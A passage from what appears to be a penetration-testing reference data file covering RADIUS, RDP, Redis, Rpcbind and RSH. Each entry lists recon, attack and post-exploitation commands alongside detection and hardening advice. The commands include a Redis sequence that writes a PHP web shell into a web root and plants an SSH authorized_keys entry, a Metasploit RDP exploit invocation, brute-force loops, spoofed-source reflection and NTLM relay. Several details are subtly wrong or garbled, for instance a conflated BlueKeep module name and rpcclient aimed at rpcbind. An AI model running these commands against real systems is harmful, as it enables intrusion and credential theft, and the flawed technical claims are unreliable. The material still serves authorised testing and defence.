      { command: "amqp-get --url amqp://<target>:5672/%2F -q <queue>", description: "Fetches a single message without acknowledging it." },
      { command: "curl -s -u <user>:<password> http://<target>:15672/api/queues", description: "Lists queues through the management API." },
      { command: "curl -s -u <user>:<password> http://<target>:15672/api/users", description: "Lists broker users and their tags." },
      { command: "nc -nv <target> 5672", description: "Reads the AMQP protocol greeting." },
    ],
    hardening: [
      {
        title: "Delete or lock the guest account",
        detail:
          "The guest account exists so a local developer can connect on day one. Remove it in production and rely on named accounts with specific permissions.",
      },
      {
        title: "Protect the management plugin",
        detail:
          "The HTTP API on 15672 has no authentication of its own. Bind it to localhost, put it behind an authenticating proxy, or leave it disabled entirely.",
      },
      {
        title: "Use a virtual host per application",
        detail:
          "Separate vhosts give you a hard boundary between producers and consumers, and the permission model then applies naturally.",
      },
      {
        title: "Require TLS on the AMQP listener",
        detail:
          "Run the listener on 5671 with a real certificate, and refuse plain AMQP on 5672 anywhere the network path is untrusted.",
      },
      {
        title: "Grant the minimum permission per user",
        detail:
          "A consumer needs read on its queue, nothing else. Split configure, write and read so a compromised consumer cannot publish into a queue it does not own.",
      },
      {
        title: "Monitor queue depth and consumers",
        detail:
          "A queue that grows without consumers or a consumer that stops and starts abruptly are both useful signals during an incident.",
      },
    ],
    tools: ["nmap", "netcat", "metasploit", "curl", "httpx", "hydra"],
  },

  {
    slug: "radius",
    name: "RADIUS",
    port: 1812,
    protocol: "udp",
    risk: "high",
    tags: ["authentication", "network", "legacy"],
    summary:
      "RADIUS carries the authentication conversation between a network access server and a central server, and the shared secret between them is the entire security model. PAP sends the password across the wire in the clear, and MS-CHAPv2 uses a challenge and response that can be captured and cracked offline. The protocol also runs over UDP, which makes it a convenient reflector, and the accounting port on 1813 records a great deal about who connected to what and when.",
    connect: [
      {
        label: "Authentication test",
        command: "radtest <user> <password> <target> 0 <shared-secret>",
        detail: "radtest comes from the freeradius-client package and performs a real Access-Request against the server.",
      },
      {
        label: "Accounting test",
        command: "radtest <user> <password> <target> 1813 <shared-secret>",
        detail: "The same utility against the accounting port shows whether accounting records are accepted and how the server responds.",
      },
      {
        label: "Protocol capture",
        command: "tcpdump -i eth0 -n -s 0 -X udp port 1812",
        detail: "Capturing one exchange shows the authenticator, the NAS identifier and the attributes the server expects.",
      },
    ],
    recon: [
      {
        title: "UDP service check",
        command: "nmap -sU -sT -p 1812,1813 -sV <target>",
        detail:
          "RADIUS gives no banner, so the identification comes from the response to a valid packet. Scanning both ports also tells you whether accounting is enabled, which is often overlooked.",
      },
      {
        title: "Shared secret validation",
        command: "radtest <user> <password> <target> 0 <shared-secret>",
        detail:
          "A correct secret produces an Access-Accept or an Access-Reject. A wrong secret produces no answer at all, so the difference between silence and a rejection is itself a test.",
      },
    ],
    enumeration: [
      {
        title: "Attribute discovery from a captured request",
        command: "tshark -Y 'radius' -T fields -e radius.code -e radius.user_name -e radius.nas_ip_address -e radius.called_station_id",
        detail:
          "A single captured exchange shows the NAS identity, the called station and the user attribute names, which reveals the network topology and the authentication flow.",
      },
      {
        title: "Supported attribute set",
        command: "radtest <user> <password> <target> 0 <shared-secret> | tee /tmp/radius.txt",
        detail:
          "The full response includes the attribute list the server returns, which shows whether EAP, message authentication and accounting are in play.",
      },
      {
        title: "Client configuration on the server",
        command: "cat /etc/raddb/clients.conf",
        detail:
          "The clients file lists every network access server and its shared secret. Reading it on a server gives you the secret without guessing.",
      },
    ],
    attacks: [
      {
        title: "Shared secret guessing",
        severity: "high",
        command: "for s in $(cat secrets.txt); do radtest <user> <password> <target> 0 \"$s\"; done",
        detail:
          "The shared secret is a single password that protects every user on the network. It is often a company name, a city or the name of the device, and it never changes because nobody remembers it.",
        detection:
          "A burst of Access-Requests for the same user with no valid session, and any request carrying an unknown NAS identifier.",
        fix: "Use a random shared secret of at least 16 characters per NAS, store it in a secrets manager and rotate it on a schedule.",
      },
      {
        title: "Offline cracking of an MS-CHAPv2 response",
        severity: "high",
        command: "john --format=mschapv2 --wordlist=/usr/share/wordlists/rockyou.txt mschapv2.txt",
        detail:
          "The MS-CHAPv2 response encodes the password with an NT hash and is not a proper challenge and response. Once captured it can be cracked offline, and the crack gives the plaintext password.",
        detection:
          "Repeated authentication attempts with the same challenge from a different source, and a large number of Access-Requests without successful sessions.",
        fix: "Move to PEAP or EAP-TLS, which use TLS for the credential exchange, and stop allowing MS-CHAPv2 against the server.",
      },
      {
        title: "UDP reflection through the authentication server",
        severity: "medium",
        command: "hping3 --udp -p 1812 -c 1 -a <victim-ip> <target>",
        detail:
          "RADIUS servers sit on well-known ports and will answer requests addressed to anyone. With the source address spoofed the reply is delivered to the victim, which is how RADIUS ends up in amplification lists.",
        detection:
          "Large UDP responses on port 1812 and a matching rise in inbound traffic to a host that does not run RADIUS.",
        fix: "Do not expose the RADIUS server to the internet, apply egress filtering to UDP 1812 and 1813, and use RadSec where the infrastructure allows it.",
      },
    ],
    postEx: [
      {
        title: "Forge an Access-Accept response",
        severity: "critical",
        command: "tcpdump -i eth0 -w radius.pcap 'udp port 1812' && tshark -r radius.pcap -Y 'radius.code == 2' -T fields -e radius.authenticator -e radius.user_name",
        detail:
          "With the shared secret and one valid response in hand, an on-path attacker can compute the response for any other user. The NAS accepts the forged reply and opens a session for an account the attacker never authenticated as.",
        detection:
          "Access-Accept responses that arrive at a NAS from an address other than the configured server, and sessions without a matching request in the log.",
        fix: "Encrypt the RADIUS exchange with RadSec, use a strong shared secret, and consider a second factor on the network access server itself.",
      },
      {
        title: "Shadow the legitimate server on the network",
        severity: "high",
        command: "sudo arpspoof -t <target> -r <radius-server-ip> && sudo arpspoof -i eth0 -t <target>",
        detail:
          "An attacker who knows the shared secret can answer Access-Requests directly. Users then authenticate against the rogue server, which hands back an accept and records the credentials at the same time.",
        detection:
          "Authentication failures on legitimate devices that succeed on others, and Access-Requests arriving at the real server with a lower volume than expected.",
        fix: "Never rely on the shared secret alone, use RadSec or EAP-TLS, and make sure RADIUS traffic cannot be redirected inside the network.",
      },
      {
        title: "Recover VPN and Wi-Fi credentials from the accounting stream",
        severity: "medium",
        command: "tshark -i eth0 -Y 'radius.code == 11' -T fields -e radius.user_name -e radius.calling_station_id -e radius.acct_session_time",
        detail:
          "Accounting records name the user, the device they connected from and how long they were online. That is a map of who was present on the network and when.",
        detection:
          "An unusual number of accounting requests from a host that is not the network access server.",
        fix: "Limit the accounting port to the network access servers, and keep the collected records in a system with its own access controls.",
      },
    ],
    commands: [
      { command: "radtest <user> <password> <target> 0 <shared-secret>", description: "Sends a real Access-Request to the server." },
      { command: "radtest <user> <password> <target> 1813 <shared-secret>", description: "Tests the accounting port." },
      { command: "nmap -sU -sT -p 1812,1813 -sV <target>", description: "Checks whether both RADIUS ports are open." },
      { command: "tcpdump -i eth0 -n -s 0 -X udp port 1812", description: "Captures the exchange in hex and ASCII." },
      { command: "tshark -Y 'radius' -T fields -e radius.code -e radius.user_name", description: "Decodes the RADIUS attributes from a capture." },
      { command: "tshark -r capture.pcap -Y 'radius.code == 11' -T fields -e radius.user_name", description: "Extracts usernames from accounting records." },
      { command: "cat /etc/raddb/clients.conf", description: "Lists the NAS clients and their shared secrets on the server." },
      { command: "cat /etc/raddb/users", description: "Shows the local user database on the server." },
      { command: "radiusd -X", description: "Starts the server in debug mode to read the full exchange." },
      { command: "nc -u -nv <target> 1812", description: "Opens a UDP session to the authentication port." },
    ],
    hardening: [
      {
        title: "Use strong per-device shared secrets",
        detail:
          "Every NAS should have its own random secret of at least 16 characters. A shared secret reused across a whole estate turns one disclosure into a network-wide problem.",
      },
      {
        title: "Enable RadSec or EAP-TLS",
        detail:
          "RadSec carries RADIUS inside TLS and EAP-TLS authenticates the user with a certificate. Both remove the password from the wire.",
      },
      {
        title: "Disable PAP and MS-CHAPv2",
        detail:
          "The legacy methods are the reason the traffic can be captured and cracked. Reject them at the server and require the modern alternatives.",
      },
      {
        title: "Restrict the listener to the NAS addresses",
        detail:
          "Only the network access servers should be able to reach ports 1812 and 1813. Everything else is refused.",
      },
      {
        title: "Apply egress filtering",
        detail:
          "Prevent the servers from sending UDP packets with a forged source address, which removes the reflection option.",
      },
      {
        title: "Monitor failed and unusual authentications",
        detail:
          "Log every Access-Request and alert on repeated failures, on new NAS identifiers and on requests that arrive outside business hours.",
      },
    ],
    tools: ["nmap", "netcat", "tshark", "tcpdump", "hydra", "metasploit"],
  },

  {
    slug: "rdp",
    name: "RDP",
    port: 3389,
    protocol: "tcp",
    risk: "critical",
    tags: ["remote-desktop", "windows", "authentication"],
    summary:
      "Remote Desktop is the most common way an attacker reaches a Windows machine after the first step, and it is frequently exposed straight to the internet. Network Level Authentication makes things better but does not make them good, since it still negotiates a challenge and response that can be captured. Older protocols in the stack carry unauthenticated remote code execution bugs, and the redirection features that make RDP convenient are also a straightforward data exfiltration path.",
    connect: [
      {
        label: "FreeRDP client",
        command: "xfreerdp /v:<target> /u:<user> /p:<password> /cert:ignore",
        detail: "The /cert:ignore flag skips the self-signed certificate warning that otherwise blocks an unattended session.",
      },
      {
        label: "Authentication only",
        command: "xfreerdp /v:<target> /u:<user> /p:<password> +auth-only",
        detail: "This completes the handshake and validates the credentials without opening a desktop, which is the quick way to test an account.",
      },
      {
        label: "CredSSP downgrade attempt",
        command: "xfreerdp /v:<target> /u:<user> /p:<password> /sec:rdp",
        detail: "Requesting the older security layer reveals whether the target still accepts the protocol that predates Network Level Authentication.",
      },
    ],
    recon: [
      {
        title: "Protocol and encryption probe",
        command: "nmap -sV -p 3389 --script rdp-enum-encryption,rdp-nmap-info <target>",
        detail:
          "rdp-enum-encryption reports the security layers the host supports, which shows whether NLA is mandatory or merely available. rdp-nmap-info adds the operating system build.",
      },
      {
        title: "Certificate inspection",
        command: "nmap -p 3389 --script ssl-cert <target>",
        detail:
          "RDP carries its own TLS negotiation, and the certificate subject often names the organisation and the machine role, which is useful context for the report.",
      },
    ],
    enumeration: [
      {
        title: "Credential check",
        command: "netexec rdp <target> -u <user> -p '<password>'",
        detail:
          "NetExec reports whether the account is valid and whether the host allows the session. A valid account with a wrong password still tells you the user exists.",
      },
      {
        title: "Anonymous session test",
        command: "xfreerdp /v:<target> /u:\"\" /p:\"\" +auth-only",
        detail:
          "Very few hosts allow this, but it costs one attempt and the answer is worth knowing before you start testing accounts.",
      },
      {
        title: "Protocol pre-authentication check",
        command: "nmap -p 3389 --script rdp-vuln-ms12-020 <target>",
        detail:
          "The script detects the pre-authentication memory corruption in the RDP service on affected Windows versions, which is the same bug that made the BlueKeep worm possible.",
      },
    ],
    attacks: [
      {
        title: "Credential attacks against an exposed port",
        severity: "high",
        command: "netexec rdp <target> -u <user> -p '<password>'",
        detail:
          "RDP is reachable from the internet far more often than it should be, and there is no rate limiting. A common password on a domain administrator account is enough to take over the whole network from there.",
        detection:
          "A burst of failed logons on 3389, particularly for accounts with a name that resembles a local administrator, and successful logons from outside the corporate network.",
        fix: "Never expose 3389 to the internet, require a VPN or a gateway, enforce multi-factor authentication and lock out repeated failures.",
      },
      {
        title: "Unauthenticated remote code execution on old hosts",
        severity: "critical",
        command: "msfconsole -q -x \"use exploit/windows/rdp/ms12_020_BlueKeep; set RHOSTS <target>; run\"",
        detail:
          "The pre-authentication memory corruption in the RDP service on Windows 7 and Windows Server 2008 gives code execution before any login is required. It was what allowed the BlueKeep worm to spread without a single credential.",
        detection:
          "Any connection attempt that sends an RDP negotiation and then terminates abnormally, and the specific malformed packets this bug produces in the network trace.",
        fix: "Patch the host, block the TCP transport for UDP 3389 which limits the amplification path, and retire operating systems that are out of support.",
      },
      {
        title: "Credential capture from the NLA handshake",
        severity: "high",
        command: "tshark -i eth0 -Y 'mstshash' -T fields -e ip.src -e ip.dst -e mstshash.client_challenge -e mstshash.client_nonce",
        detail:
          "The CredSSP exchange contains an NTLM challenge and response. Capturing it gives a hash that works against most services that accept NTLM, including the RDP session itself.",
        detection:
          "Event 4624 with logon type 3 from a source that is not the expected client, and a workstation name in the log that does not belong to the account.",
        fix: "Require NLA with the latest CredSSP patch, disable NTLM where Kerberos is available, and never allow RDP to traverse a network you do not control.",
      },
    ],
    postEx: [
      {
        title: "Relay a captured session to a target host",
        severity: "high",
        command: "impacket-ntlmrelayx -t <target> -smb2support -S <ip>",
        detail:
          "The captured authentication is relayed to the RDP service, which issues a session on the victim's behalf. The attacker gets an interactive desktop without the password.",
        detection:
          "Event 4624 type 3 logons whose source address is a host that should not be running a relay, and mismatches between the logged-on workstation name and the source address.",
        fix: "Require SMB signing, restrict inbound RDP to management hosts, and enforce the policy that blocks NTLM logon.",
      },
      {
        title: "Move credentials through the redirected clipboard",
        severity: "medium",
        command: "xfreerdp /v:<target> /u:<user> /p:<password> /drive:share,/mnt/share /clipboard",
        detail:
          "Clipboard and drive redirection is enabled by default on many deployments. Once inside a session, the attacker can read anything the user copies and pull files off the redirected drive.",
        detection:
          "Large clipboard or drive transfers in a session, and file downloads from a workstation that exceeds its normal pattern.",
        fix: "Restrict redirection with Group Policy, disable drive mapping on privileged hosts, and monitor for unusual clipboard volume in a session.",
      },
      {
        title: "Escalate a single session into a local administrator",
        severity: "high",
        command: "netexec rdp <target> -u <user> -p '<password>' -x 'whoami /all && net localgroup Administrators'",
        detail:
          "The command executes on the remote host through the same service, and the output tells you which groups the account belongs to and what it can reach. A low-privilege session that is a member of a privileged group changes the whole picture.",
        detection:
          "A session that begins as one user and later runs a command under a different identity, and any use of runas or scheduled tasks from an RDP session.",
        fix: "Do not grant administrative group membership through a remote desktop session, use separate accounts for administration, and require MFA for privileged access.",
      },
    ],
    commands: [
      { command: "nmap -sV -p 3389 --script rdp-enum-encryption,rdp-nmap-info <target>", description: "Reports the supported security layers and the OS build." },
      { command: "nmap -p 3389 --script rdp-vuln-ms12-020 <target>", description: "Checks for the pre-authentication memory corruption bug." },
      { command: "nmap -p 3389 --script ssl-cert <target>", description: "Prints the certificate served by the RDP endpoint." },
      { command: "xfreerdp /v:<target> /u:<user> /p:<password> /cert:ignore", description: "Opens an interactive session." },
      { command: "xfreerdp /v:<target> /u:<user> /p:<password> +auth-only", description: "Validates credentials without opening a desktop." },
      { command: "xfreerdp /v:<target> /u:<user> /p:<password> /sec:rdp", description: "Attempts the older CredSSP security layer." },
      { command: "netexec rdp <target> -u <user> -p '<password>'", description: "Tests an account against the service." },
      { command: "hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<target>", description: "Runs a dictionary attack against the RDP port." },
      { command: "tshark -Y 'mstshash' -T fields -e mstshash.client_challenge -e mstshash.client_nonce", description: "Extracts the NTLM exchange from the handshake." },
      { command: "rdesktop -u <user> <target>", description: "Connects with the older rdesktop client." },
    ],
    hardening: [
      {
        title: "Never publish 3389 to the internet",
        detail:
          "Move RDP behind a VPN, a jump host or a published application gateway. There is no configuration of the service itself that makes it safe on a public address.",
      },
      {
        title: "Require Network Level Authentication",
        detail:
          "NLA authenticates before the session is created, which removes a large class of pre-authentication attacks. Set it as mandatory rather than optional.",
      },
      {
        title: "Patch CredSSP and disable UDP transport",
        detail:
          "Update the CredSSP library on both ends, and block UDP 3389 to the internet. This closes the amplification path and removes the older protocol negotiation.",
      },
      {
        title: "Enforce multi-factor authentication",
        detail:
          "Put RDP behind a gateway that enforces a second factor, since the password is the first factor and passwords on RDP endpoints are heavily targeted.",
      },
      {
        title: "Restrict redirection",
        detail:
          "Turn off clipboard, drive and printer redirection where they are not needed, especially on servers and on administrative hosts.",
      },
      {
        title: "Restrict by source address and log everything",
        detail:
          "Allow the port only from management networks, and record every successful session with its source address so unusual entries stand out.",
      },
    ],
    tools: ["nmap", "hydra", "netexec", "metasploit", "impacket", "tshark"],
  },

  {
    slug: "redis",
    name: "Redis",
    port: 6379,
    protocol: "tcp",
    risk: "critical",
    tags: ["database", "cache", "in-memory"],
    summary:
      "Redis keeps its dataset in memory and talks a text protocol that is trivial to script from the command line. The stock configuration has no password and binds to every interface, so a forgotten firewall rule turns the cache into a fully readable and writable database. Its replication and module features go further still, because they allow a second server to push arbitrary native code into the first.",
    connect: [
      {
        label: "redis-cli",
        command: "redis-cli -h <target> -p 6379",
        detail: "Use --no-auth-warning to silence the notice about the password being passed on the command line.",
      },
      {
        label: "Secure connection",
        command: "redis-cli -h <target> --tls --cacert /etc/ssl/ca.crt",
        detail: "The TLS options match a server started with tls-port and a certificate chain.",
      },
      {
        label: "URL form",
        command: "redis://:<password>@<target>:6379/0",
        detail: "The URL form is how most application frameworks and secret stores deliver the credential.",
      },
    ],
    recon: [
      {
        title: "Service and capability probe",
        command: "nmap -sV -p 6379 --script redis-info <target>",
        detail:
          "The script returns the version, the configured memory limit, the role and the key counts. The role line tells you whether this node is a master that accepts replication commands.",
      },
      {
        title: "Banner check",
        command: "printf 'PING\\r\\n' | nc -nv <target> 6379",
        detail:
          "An unauthenticated instance replies with +PONG. If the socket closes straight away, a password has been configured.",
      },
    ],
    enumeration: [
      {
        title: "Server state",
        command: "redis-cli -h <target> INFO keyspace",
        detail:
          "The keyspace section reports how many keys each database holds. A non-zero count on something labelled as a cache means the cache is the system of record.",
      },
      {
        title: "Runtime configuration",
        command: "redis-cli -h <target> CONFIG GET dir dbfilename requirepass",
        detail:
          "dir and dbfilename decide where the dataset is written to disk, and requirepass shows whether authentication is on. The write path is the part that matters most.",
      },
      {
        title: "Key inventory",
        command: "redis-cli -h <target> --scan --pattern '*' | head -100",
        detail:
          "SCAN walks the keyspace without blocking the server the way KEYS does. Key names alone often describe the whole application model.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated read and write access",
        severity: "critical",
        command: "redis-cli -h <target> KEYS '*'",
        detail:
          "If the server answers without a password, everything is available. Session tokens, cached credentials and application state can all be read, and any key can be overwritten.",
        detection:
          "INFO, SCAN and CONFIG commands arriving from a host that does not run the application, and any CONFIG SET that points dir outside the data directory.",
        fix: "Set requirepass and define per-application ACLs, bind the service to a private interface and place it behind TLS.",
      },
      {
        title: "Replication abuse for native code execution",
        severity: "critical",
        command: "python3 redis-rogue-server.py -p 6379 -r <ip> --eval-module /usr/share/redis/modules/redisgraph.so",
        detail:
          "A node can be made a replica of an attacker-controlled server. The server then loads a shared object into the target process, and the code inside that object runs with the privileges of the Redis service account.",
        detection:
          "SLAVEOF or REPLICAOF commands that point at an address outside the expected topology, and a module being loaded at the same moment.",
        fix: "Disable the module and replication commands for anything that does not need them, restrict CONFIG in the ACL, and never expose the port to untrusted networks.",
      },
      {
        title: "Weak or missing authentication password",
        severity: "high",
        command: "hydra -l '' -P /usr/share/wordlists/redis-pass.txt <target> redis",
        detail:
          "Redis does not throttle authentication attempts, so a short password is an offline problem. Many deployments added a password but kept it simple enough to guess.",
        detection:
          "A cluster of authentication failures against the Redis port from one source address.",
        fix: "Use a long generated password, enable ACLs so each application has its own credential, and rotate it through a secret manager.",
      },
    ],
    postEx: [
      {
        title: "Turn the cache into a code execution path",
        severity: "critical",
        command:
          "redis-cli -h <target> CONFIG SET dir /var/www/html\nredis-cli -h <target> CONFIG SET dbfilename shell.php\nredis-cli -h <target> SET payload '<?php system($_GET[\"c\"]); ?>'\nredis-cli -h <target> SAVE",
        detail:
          "The dataset is written to disk as a file whose name and location you choose. Pointing both at a directory the web server serves turns a cache write into a remote shell.",
        detection:
          "Files appearing in a web root with names matching a Redis dbfilename, and CONFIG SET with a dir outside the configured data directory.",
        fix: "Rename or deny CONFIG for application users, keep the service account away from web roots, and monitor the data directory for new files.",
      },
      {
        title: "Plant a login key",
        severity: "high",
        command:
          "redis-cli -h <target> CONFIG SET dir /root/.ssh\nredis-cli -h <target> CONFIG SET dbfilename authorized_keys\nredis-cli -h <target> SET payload \"$(cat ~/.ssh/id_rsa.pub)\"\nredis-cli -h <target> SAVE",
        detail:
          "The same write primitive applies to an authorised keys file. It creates a durable shell account that no password rotation will remove.",
        detection:
          "Any write outside the configured data directory, and new authorised_keys entries without a matching change ticket.",
        fix: "Restrict CONFIG and the save commands, run the service under an account that cannot write to any home directory, and keep SSH keys out of shared hosts.",
      },
      {
        title: "Lock the administrator out",
        severity: "medium",
        command: "redis-cli -h <target> CONFIG SET requirepass '<new-password>'",
        detail:
          "Setting a password that only the attacker knows denies the legitimate operator access to the service. It is a small denial of service that also hides the earlier activity behind an authentication failure.",
        detection:
          "Authentication failures from the application's source address and an unexpected CONFIG SET on the password field.",
        fix: "Restrict CONFIG to a dedicated operations role, keep the password in a secret store that the application and the administrator both read from, and alert on configuration changes.",
      },
    ],
    commands: [
      { command: "PING", description: "Liveness check, answered with +PONG." },
      { command: "INFO", description: "Server state, memory, clients, persistence and replication." },
      { command: "INFO keyspace", description: "Key counts per database." },
      { command: "SCAN 0", description: "Iterates the keyspace without blocking the server." },
      { command: "TYPE <key>", description: "Reports the type of a key, such as string or list." },
      { command: "TTL <key>", description: "Time to live in seconds, with -1 for no expiry." },
      { command: "CONFIG GET dir", description: "Shows the working directory used for dataset writes." },
      { command: "CONFIG SET dir <path>", description: "Changes where the dataset is written on disk." },
      { command: "SLAVEOF <ip> <port>", description: "Makes this node a replica of the server at that address." },
      { command: "MODULE LOAD <path>", description: "Loads a shared object into the server process." },
    ],
    hardening: [
      {
        title: "Require authentication and use ACLs",
        detail:
          "Set requirepass to a long generated value and give each application a named user with only the commands it needs. Shared credentials make revocation impossible.",
      },
      {
        title: "Restrict the dangerous commands",
        detail:
          "Rename CONFIG, MODULE, DEBUG and SLAVEOF to something the application does not use, or deny them in the ACL. The rename-command option has been in Redis for a long time and works.",
      },
      {
        title: "Bind to a private interface",
        detail:
          "Set bind to the internal address and leave port 6379 closed to the internet. Most exposure comes from an unnecessary listen directive.",
      },
      {
        title: "Enable TLS",
        detail:
          "Start with tls-port and a certificate chain so that the AUTH password and the data are never sent in the clear.",
      },
      {
        title: "Run the service with minimal privilege",
        detail:
          "The service account should not be able to write to a web root, to a home directory or to any location that another service reads.",
      },
      {
        title: "Watch for configuration changes",
        detail:
          "Alert on CONFIG SET, on SLAVEOF and on MODULE LOAD, and on any connection from a host that does not normally talk to the cache.",
      },
    ],
    tools: ["redis-cli", "nmap", "hydra", "metasploit", "netcat", "netexec"],
  },

  {
    slug: "rpcbind",
    name: "Rpcbind",
    port: 111,
    protocol: "udp",
    risk: "medium",
    tags: ["rpc", "linux", "legacy"],
    summary:
      "Rpcbind is the directory that tells clients which port each RPC service is listening on. On its own it grants nothing, but it converts a closed service into a findable one and describes the shape of the host to anyone who asks. Older SunRPC stacks that it advertises, particularly mountd and rquotad, have a history of unauthenticated remote code execution, so the portmapper is rarely the finding and is regularly the way in.",
    connect: [
      {
        label: "Program map",
        command: "rpcinfo -p <target>",
        detail: "Lists every registered program with its version, protocol and port. This is the first command to run against any RPC host.",
      },
      {
        label: "Program status",
        command: "rpcclient -N <target> -U '' -c 'status'",
        detail:
          "The null session often works against rpcbind and the status command returns the running pid and the service names it serves.",
      },
      {
        label: "Raw connection",
        command: "nc -nv <target> 111",
        detail: "The portmapper answers a NULL call with a list of its registered programs in a single packet.",
      },
    ],
    recon: [
      {
        title: "RPC program enumeration",
        command: "nmap -sU -p 111 --script rpcinfo <target>",
        detail:
          "The script sends a NULL call and parses the reply, which lists the registered programs and their ports. Compare that list against the ports you found open.",
      },
      {
        title: "TCP and UDP check",
        command: "nmap -sU -sT -p 111 <target>",
        detail:
          "The portmapper listens on UDP 111 and TCP 111 with a different protocol, so both need checking. A closed TCP portmapper does not mean the RPC services are gone.",
      },
    ],
    enumeration: [
      {
        title: "Registered programs",
        command: "rpcinfo -p <target>",
        detail:
          "The listing shows programs such as nfs, mountd, rquotad and status. Each one is a separate attack surface and each has its own port.",
      },
      {
        title: "Daemon status over a null session",
        command: "rpcclient -N <target> -U '' -c 'status'",
        detail:
          "The response includes the daemon pid and the name of every program it serves, and no credentials are required on many hosts.",
      },
      {
        title: "Client list for a program",
        command: "rpcclient -N <target> -U '' -c 'list'",
        detail:
          "The list command returns the hosts that have contacted the daemon, which is a small but free piece of network reconnaissance.",
      },
    ],
    attacks: [
      {
        title: "Enumeration of the internal RPC surface",
        severity: "medium",
        command: "rpcinfo -p <target>",
        detail:
          "The portmapper tells the attacker which ports to attack and which services are running. It is reconnaissance that takes one packet and needs no credential.",
        detection:
          "NULL calls and program lookups from hosts that are not RPC clients, and a burst of queries for programs that are not present on the host.",
        fix: "Restrict UDP and TCP 111 to the hosts that genuinely need it, and disable the RPC services themselves where they are not used.",
      },
      {
        title: "Reaching an unauthenticated RPC daemon",
        severity: "high",
        command: "rpcinfo -p <target> | grep -E 'mountd|rquotad|statd'",
        detail:
          "The portmapper hands you the exact port of mountd or rquotad, and those daemons have historically had buffer and format string bugs reachable without authentication. The portmapper is the index to the vulnerability.",
        detection:
          "Requests to the mountd and rquotad ports from addresses outside the server segment, especially ones that are not well-formed RPC calls.",
        fix: "Disable the legacy daemons, use NFSv4 which needs far less of the SunRPC stack, and firewall the RPC ports from untrusted networks.",
      },
      {
        title: "UDP reflection through the portmapper",
        severity: "medium",
        command: "hping3 --udp -p 111 -c 1 -a <victim-ip> <target>",
        detail:
          "A NULL call with a spoofed source address makes the portmapper answer the victim instead of you. It is one of the older and better known UDP reflectors.",
        detection:
          "Inbound traffic to hosts that do not run rpcbind, and a matching increase in outbound UDP 111 responses.",
        fix: "Do not expose the portmapper to the internet and apply egress filtering so the host cannot send packets with a forged source address.",
      },
    ],
    postEx: [
      {
        title: "Map every service the host offers",
        severity: "medium",
        command: "rpcinfo -p <target> && rpcinfo -a <ip>",
        detail:
          "The second form asks the portmapper about a specific address on the local network, which returns the services registered for that address. The output is a complete service map.",
        detection:
          "Program lookups for addresses that the querying host has no relationship with.",
        fix: "Keep the portmapper off any network that untrusted systems can reach, and treat the service map as sensitive internal documentation.",
      },
      {
        title: "Use the trusted host list for remote commands",
        severity: "high",
        command: "rsh -l <user> <target> id",
        detail:
          "The .rhosts file on the target decides whether the remote shell accepts the connection based on the source address alone. It runs on port 514 and never asks for a password.",
        detection:
          "rsh sessions from hosts that are not in the trusted list, and any session where the source address is different from the usual administration jump host.",
        fix: "Remove .rhosts entries entirely, replace rsh with SSH, and if the mechanism must stay, restrict it to dedicated management addresses.",
      },
      {
        title: "Enumerate shared exports through mountd",
        severity: "medium",
        command: "showmount -e <target>",
        detail:
          "The mount daemon advertises its export table to anyone who asks. The paths it lists tell you what data is on the server and where the interesting directories are.",
        detection:
          "Export queries from hosts outside the client subnet, particularly from machines that have never mounted anything.",
        fix: "Restrict the export table to named clients, keep root_squash enabled and firewall the RPC ports to the servers that mount the shares.",
      },
    ],
    commands: [
      { command: "rpcinfo -p <target>", description: "Lists the registered programs and their ports." },
      { command: "rpcinfo -a <ip>", description: "Lists the services registered for one address." },
      { command: "rpcinfo -d <program> <version>", description: "Deregisters a program on a server you control." },
      { command: "rpcclient -N <target> -U '' -c 'status'", description: "Reads the daemon status over a null session." },
      { command: "rpcclient -N <target> -U '' -c 'list'", description: "Returns the hosts known to the daemon." },
      { command: "pmap -p <target>", description: "Prints the remote program map in the classic format." },
      { command: "showmount -e <target>", description: "Asks mountd for the export table." },
      { command: "nmap -sU -p 111 --script rpcinfo <target>", description: "Enumerates the programs with an NSE script." },
      { command: "nc -nv <target> 111", description: "Opens a connection to the portmapper." },
      { command: "systemctl status rpcbind", description: "Shows the local portmapper service state." },
    ],
    hardening: [
      {
        title: "Disable the RPC services you do not need",
        detail:
          "The portmapper exists only to advertise services such as NFS and the old ypbind. On a host that needs none of them, stop and disable the daemon entirely.",
      },
      {
        title: "Filter the portmapper ports",
        detail:
          "Close UDP 111 and TCP 111 from every network that does not need them. The same goes for the ports the RPC services themselves use.",
      },
      {
        title: "Prefer NFSv4",
        detail:
          "NFSv4 uses a single well-known port and a central export list, which removes most of the rpcbind surface along with the standalone daemons.",
      },
      {
        title: "Lock down the export table",
        detail:
          "Name the allowed hosts explicitly, keep root_squash on and mark the exports read-only where the workload allows it.",
      },
      {
        title: "Watch for enumeration attempts",
        detail:
          "Log NULL calls and program lookups, and alert on a source address that suddenly starts asking what is registered on the host.",
      },
    ],
    tools: ["nmap", "netcat", "metasploit", "hydra"],
  },

  {
    slug: "rsh",
    name: "RSH",
    port: 514,
    protocol: "tcp",
    risk: "high",
    tags: ["remote-shell", "legacy", "unix"],
    summary:
      "Remote shell is a service from the rsh suite that opens a command on a remote host over TCP 514 with no encryption and no password prompt. Authorisation comes from the .rhosts file on the server, which lists the trusted client addresses, so any user on a listed machine may run any command as any account. The service has been considered unfit for production for decades and still turns up on old build hosts and appliances.",
    connect: [
      {
        label: "Remote command",
        command: "rsh -l <user> <target> id",
        detail: "The -l flag names the account to run as. If the server trusts your source address, no password is asked for.",
      },
      {
        label: "Interactive login",
        command: "rlogin -l <user> <target>",
        detail:
          "rlogin uses the same .rhosts mechanism but presents a login prompt, and it falls back to a password when the address is not trusted.",
      },
      {
        label: "Raw connection",
        command: "nc -nv <target> 514",
        detail: "The server prints a short banner that identifies the rsh service before it waits for the command.",
      },
    ],
    recon: [
      {
        title: "Service and banner",
        command: "nmap -sV -p 514 --script banner <target>",
        detail:
          "TCP 514 is rsh while UDP 514 is normally syslog, so both protocols must be checked. A host answering with an rsh banner on TCP has the service enabled.",
      },
      {
        title: "Syslog check on the UDP side",
        command: "nmap -sU -p 514 --script syslog <target>",
        detail:
          "The syslog listener on UDP 514 accepts messages from any source. If it also accepts remote logging, an attacker can inject entries into the host's log stream.",
      },
    ],
    enumeration: [
      {
        title: "Trust relationship test",
        command: "rsh -l <user> <target> 'id'",
        detail:
          "The answer is the whole result. A successful command proves your source address is trusted, and the same trust applies to every account on the server.",
      },
      {
        title: "Locate the trust files",
        command: "find / -name '.rhosts' -type f 2>/dev/null | head -20",
        detail:
